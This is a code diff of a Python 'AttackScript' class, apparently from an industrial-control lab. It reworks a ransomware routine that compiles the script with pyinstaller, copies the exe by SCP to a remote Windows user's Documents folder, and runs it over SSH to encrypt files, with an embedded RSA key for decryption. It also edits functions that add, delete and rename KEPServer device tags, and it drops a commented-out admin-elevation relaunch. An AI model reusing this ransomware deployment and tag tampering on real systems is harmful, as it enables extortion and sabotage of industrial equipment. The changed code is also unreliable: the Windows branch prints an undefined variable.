@@ -1,4 +1,5 @@
 from os import walk, path, remove, system, getcwd, mkdir, scandir, urandom, kill, rmdir
+import subprocess
 from psutil import process_iter
 import signal
 import base64
@@ -7,19 +8,12 @@ from Cryptodome.PublicKey import RSA
 from Cryptodome.Cipher import PKCS1_OAEP, AES
 from shutil import copyfile
 from subprocess import run, check_call, CalledProcessError, PIPE, check_output, call
-# import ctypes
 from sys import executable, argv
-# from win32netcon import ACCESS_ALL
-# from win32net import NetShareAdd
 from time import sleep
-# from win32console import GetConsoleWindow
-# from win32gui import ShowWindow
 import kepconfig
-import pkgutil
 from kepconfig import connection, admin, connectivity, datalogger
 import json
 import sys
-# from Powershell.callPowerShell import runPowerShellScript
 import paramiko
 from scp import SCPClient
 import socket
@@ -58,21 +52,13 @@ class AttackScript:
         # self.MODPOLL_PATH = r"C:\Windows\Temp\SmartMetertest"
         self.MODPOLL_PATH = "C:\\Users\\Student"
 
+        # Path for generating exe with docker pyinstaller
+        self.SCRIPT_NAME = path.basename(__file__)
+        self.REQUIREMENTS_FILE = 'requirements.txt'
+
     ###########
     # ATTACKS #
     ###########
-
-    # Check if the script is running with administrator privileges, if not, restart with elevated privileges
-    # def check_admin() -> None:
-    #     """
-    #     Check if script is running wit admin privilege. Else, restart as admin.
-    #     """
-    #     try:
-    #         isAdmin = ctypes.windll.shell32.IsUserAnAdmin()
-    #     except AttributeError:
-    #         isAdmin = False
-    #     if not isAdmin:
-    #         ctypes.windll.shell32.ShellExecuteW(None, "runas", executable, __file__, None, 1)
 
     def ssh_run_command(self, command: str) -> str:
         """
@@ -388,21 +374,84 @@ class AttackScript:
         
     def Ransom(self, revert: bool=False) -> None:
 
+        full_path_remote = "C:\\Users\\Student\\Documents\\"
         executable_name = path.basename(__file__).rsplit(".", 1)[0] + ".exe"
 
         if revert:
             decrypt = ""
-            decrypt = self.ssh_run_command("C:\\Users\\Student\\Documents\\" + executable_name + " 32")
+            decrypt = self.ssh_run_command(full_path_remote + executable_name + " 32")
             print(decrypt)
+            return 
 
-        # checkEXE = self.ssh_run_command("dir C:\\Users\\Student\\Documents")
-        # if executable_name in checkEXE:
-        #     print("Executable already in documents folder")
-        # else:
-        output = self.transfer_exe_remotely("C:\\Users\\Student\\Documents\\")
-        print(output)
-        run_exe = self.ssh_run_command("C:\\Users\\Student\\Documents\\" + executable_name + " 30")
-        print(run_exe)
+        # Check Linux
+        if platform.system() == "Linux":
+            print("Not allowed to compile with current platform")
+            check_exe = self.ssh_run_command("dir " + full_path_remote + executable_name)
+            print(check_exe)
+            if executable_name in check_exe:
+                print("Previously injected executable exist on remote system, Running ransom encryption")  
+                run_exe = self.ssh_run_command(full_path_remote + executable_name + " 30")
+                print(run_exe)
+            else:
+                raise Exception("Invalid Platform")
+
+        # Check Windows
+        elif platform.system() == "Windows":
+            output = self.transfer_exe_remotely(full_path_remote)
+            print(output)
+            print(run_exe)
+
+        # Check macOS
+        elif platform.system() == "Darwin":
+            print("Not allowed to compile with current platform")
+            check_exe = self.ssh_run_command("dir " + full_path_remote + executable_name)
+            print(check_exe)
+            if executable_name in check_exe:
+                print("Previously injected executable exist on remote system, Running ransom encryption")  
+                run_exe = self.ssh_run_command(full_path_remote + executable_name + " 30")
+                print(run_exe)
+            else:
+                raise Exception("Invalid Platform")
+
+    # def build_executable(self) -> None:
+    #     executable_name = self.SCRIPT_NAME.rsplit(".", 1)[0] + ".exe"
+    #     # Step 1: Create a Dockerfile
+    #     dockerfile_content = f'''
+    #     FROM python:3.12.0b3-windowsservercore-ltsc2022
+
+    #     WORKDIR /src
+
+    #     COPY {self.REQUIREMENTS_FILE} .
+
+    #     RUN pip install --no-cache-dir -r {self.REQUIREMENTS_FILE}
+
+    #     COPY . .
+    #     '''
+
+    #     with open('Dockerfile', 'w') as dockerfile:
+    #         dockerfile.write(dockerfile_content)
+
+    #     # Step 2: Build the Docker image
+    #     subprocess.run('docker build -t pyinstallertest .', shell=True)
+
+    #     # # Step 3: Remove the existing container if it exists
+    #     # subprocess.run('docker rm -f generateEXEWindows', shell=True)
+
+    #     #  # Step 4: Run the Docker container
+    #     # subprocess.run(f'docker run -v "$(pwd):/src/" --name generateEXEWindows engineervix/pyinstaller-windows', shell=True)
+        
+    #     executable_path = path.join('dist', self.SCRIPT_NAME.split('.')[0])
+    #     return executable_path
+
+    # def TEST(self) -> None:
+    #     print("THIS WORKS? MAYBE")
+    #     print(path.basename(__file__))
+    #     # full_path_remote = "C:\\Users\\Student\\Documents\\"
+    #     # executable_name = path.basename(__file__).rsplit(".", 1)[0] + ".exe"
+
+
+    #     # run_exe = self.ssh_run_command(full_path_remote + executable_name + " 30")
+    #     # print(run_exe)
 
     def revert_decrypt(self) -> None:
         privatekey = '''-----BEGIN RSA PRIVATE KEY-----
@@ -1384,17 +1433,17 @@ class AttackScript:
 
     ## TAG FOR DEVICE
 
-    def kep_get_full_tag_structure(self, channel, device):  ## ADDED to get full tag structure
+    def kep_get_full_tag_structure(self, channel, device): 
         server = self.kep_connect()
         device_to_get = ".".join([channel, device])
         print(json.dumps(connectivity.tag.get_full_tag_structure(server, device_to_get), indent=4))
 
-    def kep_get_single_tag(self, channel, device, tag):  ## ADDED to get all tags
+    def kep_get_single_tag(self, channel, device, tag):  
         server = self.kep_connect()
         device_to_get = ".".join([channel, device, tag])
         print(json.dumps(connectivity.tag.get_tag(server, device_to_get), indent=4))
 
-    def kep_add_tag(self, channel, device, name, tag_address):  ## ADDED to add tags
+    def kep_add_tag(self, channel, device, name, tag_address): 
         server = self.kep_connect()
         device_to_get = ".".join([channel, device])
         print(f"device_to_get={device_to_get}, name={name}, tag_address={tag_address}")
@@ -1402,16 +1451,15 @@ class AttackScript:
                                                                           "servermain.TAG_ADDRESS": tag_address}),
                          indent=4))
 
-    def kep_del_tag(self, channel, device, name):  ## ADDED to del tags
+    def kep_del_tag(self, channel, device, name): 
         server = self.kep_connect()
         device_to_get = ".".join([channel, device, name])
         print(json.dumps(connectivity.tag.del_tag(server, device_to_get), indent=4))
 
-    def kep_modify_tag(self, channel, device, name, new_name):  ## ADDED to modify tags ---- NOTE PROJECTID will change everytime so allow user to enter the ID or Copy from get_all_tags function
+    def kep_modify_tag(self, channel, device, name, new_name): # ---- NOTE PROJECTID will change everytime so allow user to enter the ID or Copy from get_all_tags function
         server = self.kep_connect()
         device_to_get = ".".join([channel, device, name])
         print(json.dumps(connectivity.tag.modify_tag(server, device_to_get, {"common.ALLTYPES_NAME": new_name}, True), indent=4))
-        # print(json.dumps(connectivity.tag.get_all_tags(server, device_to_get), indent=4))
 
     def kep_auto_tag_gen(self, channel, device):
         server = self.kep_connect()
@@ -1769,8 +1817,9 @@ class AttackScript:
         Args:
             remote_path (str): the remote path to send the exe. (Does NOT include the filename) By default uses the modpoll path
         """
+            
         executable_name = path.basename(__file__).rsplit(".", 1)[0] + ".exe"
-        compiled_exe_output = run(["pyinstaller", "--name" , executable_name, "-F", "--onefile", path.basename(__file__)], stdout=PIPE)
+        compiled_exe_output = run(["pyinstaller", "-F", "--onefile", path.basename(__file__)], stdout=PIPE)
         print(compiled_exe_output)
 
         if remote_path is None:
@@ -1782,9 +1831,7 @@ class AttackScript:
         local_full_path = path.join("dist", executable_name)
 
         print(f"Path name is {remote_path}\\{executable_name}")
-        self.scp_transfer_file(local_full_path, remote_full_path)
-
-        # print(self.ssh_run_command(f"{self.MODPOLL_PATH}\\{sys.argv[0][:-3]}.exe cool"))
+        self.scp_transfer_file(local_full_path, remote_full_path)  
 
     def progress4(self, filename, size, sent, peername):
         sys.stdout.write("(%s:%s) %s's progress: %.2f%%   \r" % (
@@ -1964,9 +2011,6 @@ class AttackScript:
 
         if len(argv) > 2: # NOTE: This is not final, may use Args Parse instead to specify revert=True
             revert = True
-
-        # if attack_option != "1":
-        #     check_admin()
 
         match attack_option:
             case "cool": self.dummy_test()
